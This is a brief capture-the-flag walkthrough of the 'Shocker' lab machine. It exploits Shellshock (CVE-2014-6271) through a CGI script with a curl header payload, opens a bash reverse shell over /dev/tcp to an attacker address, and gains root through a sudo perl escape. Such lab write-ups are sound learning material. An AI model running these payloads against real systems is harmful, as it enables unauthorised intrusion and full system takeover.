# Shocker

We proceed with this bad boy :D

## Port 80

We see that on port 80 we have a page and with the nmap scan we know that we are running on a Apache server.

We run dirbuster on the route `/cgi-bin/` and we find a file called user.sh
so we run in to the **[CVE-2014-6271](https://github.com/opsxcq/exploit-CVE-2014-6271)** and we run


```
curl -H "user-agent: () { :; }; echo;echo; /bin/bash -c 'id'" http://10.10.10.56/cgi-bin/user.sh
```

After this we get 

*uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)*

so we proceed with the ol'reverse shell

* `nc -lvp 8080`
* `bash -i >& /dev/tcp/10.10.10.10/8080 0>&1`

We combine the *curl* and old reverse shell and our bad boy is ready to go

```
└─$ curl -H "user-agent: () { :; }; echo;echo; /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.10/8080 0>&1'" http://10.10.10.56/cgi-bin/user.sh
```

We type `sudo -l` we find that we have sudoer privileges so we scale trough that since we see *(root) NOPASSWD: /usr/bin/perl* we can just do this

```
sudo /usr/bin/perl -e 'exec "/bin/sh"'
```

We run `whoami`  and surprise we are *root* so we capture the flag!